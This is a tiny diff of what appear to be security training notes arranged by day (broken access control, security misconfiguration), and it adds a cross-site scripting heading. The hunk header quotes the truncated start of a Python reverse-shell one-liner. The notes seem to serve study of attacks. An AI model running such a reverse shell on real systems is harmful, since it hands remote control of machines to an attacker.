@@ -15,3 +15,4 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ## Day 5 : Broken Access Control
 
 ## Day 6 : Security Misconfiguration
+## Day 7 : Cross-site Scripting
